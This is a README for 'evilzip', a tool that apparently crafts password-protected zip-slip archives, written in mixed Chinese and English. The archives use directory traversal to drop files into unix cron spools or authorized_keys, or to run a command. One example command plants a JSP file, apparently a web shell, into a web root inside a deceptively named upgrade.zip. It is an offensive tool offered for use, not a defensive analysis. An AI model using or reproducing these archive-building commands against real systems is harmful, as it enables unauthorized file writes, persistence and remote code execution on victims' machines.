# evilzip

## logs

* 20210723 去除可执行权限(crontab和authorized_keys均仅需可读可写即可 无需执行权限)。

* 20210701 修改权限问题,让解压后的文件默认就有读写执行的权限。

## About
evilzip lets you create a zip file(with password) that contains files with directory traversal characters in their embedded path.  Most commercial zip program (winzip, etc) will prevent extraction of zip files whose embedded files contain paths with directory traversal characters.  However, many software development libraries do not include these same protection mechanisms (ex. Java, PHP, etc).  If a program and/or library does not prevent directory traversal characters then evilzip can be used to generate zip files that, once extracted, will place a file at an arbitrary location on the target system.

## 关于项目

原使用的创建恶意压缩包的工具[evilarc](https://github.com/ptoomey3/evilarc)不支持带密码的压缩包,且没法修改,因为其使用的zipfile模块不支持加密码压缩，所以就有了这个项目。在evilarc的基础上新增了一些自己常用的功能，比如仅需一个参数就生成可以穿越到unix系统计划任务的压缩包。

具体参数如下:

```
╭─ fucker ~/Coding/Java/Intellij/evilzip/
╰─ java -jar evilzip.jar -h
Usage: java -jar EvilZip.jar [options]
  Options:
    -f, --file
      File to input archive.
      Default: root
    -p, --path
      Path to include in filename after traversal
      Default: var/spool/cron/
    -pwd, --password
      ZIP file encrypt password.
    -o, --output
      File to output archive.
      Default: evil.zip
    -d, --depth
      Number directories to traverse.
      Default: 8
    -t, --type
      OS platform for archive (win|unix).
      Default: unix
    -c, --cmd
      Command to execute.
    -h, --help
      Show this message
```

## 一些tips


读取本地的gaga.jsp 让其穿越10层目录最终解压到/wwwroot/xxxx/gaga.jsp 解压密码为update-password 输出的压缩包名为upgrade.zip

```
java -jar evilzip.jar -f gaga.jsp -d 10 -p wwwroot/xxxx/ -o upgrade.zip -t unix -pwd "update-password"
```

大部分参数均带有默认值，不用指定也行。
